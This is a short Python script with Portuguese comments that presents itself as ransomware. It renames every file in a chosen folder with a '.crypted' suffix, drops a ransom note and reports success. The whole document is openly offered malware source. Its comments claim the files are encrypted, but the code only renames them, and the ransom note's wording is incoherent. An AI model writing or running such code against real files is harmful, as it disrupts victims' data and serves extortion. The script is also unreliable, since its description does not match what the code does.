import os
import time

# Pasta para ransom
folder = '/caminho/para/sua/pasta'

# Nome do arquivo criptografado
encrypted_name = '.crypted'

# Nome do arquivo com a mensagem do ransomware
ransom_name = 'ransom.txt'

# Criptografa todos os arquivos na pasta
for filename in os.listdir(folder):
    # Ignora arquivos já criptografados e a mensagem do ransomware
    if filename.endswith(encrypted_name) or filename.endswith(ransom_name):
        continue

    # Renomeia o arquivo original para o arquivo criptografado
    original_path = os.path.join(folder, filename)
    encrypted_path = os.path.join(folder, filename + encrypted_name)
    os.rename(original_path, encrypted_path)

# Cria a mensagem do ransomware
with open(os.path.join(folder, ransom_name), 'w') as file:
    file.write('Opa! Aparentemente, os arquivos nesta pasta foram ransomware.\n\n')
    file.write('Por favor, nos ajude a recuperar nossos dados, fornecendo-nos a senha de ransomware.\n\n')
    file.write('Sua atenção é realmente necessária!')

print('Ransomware executado com sucesso.')
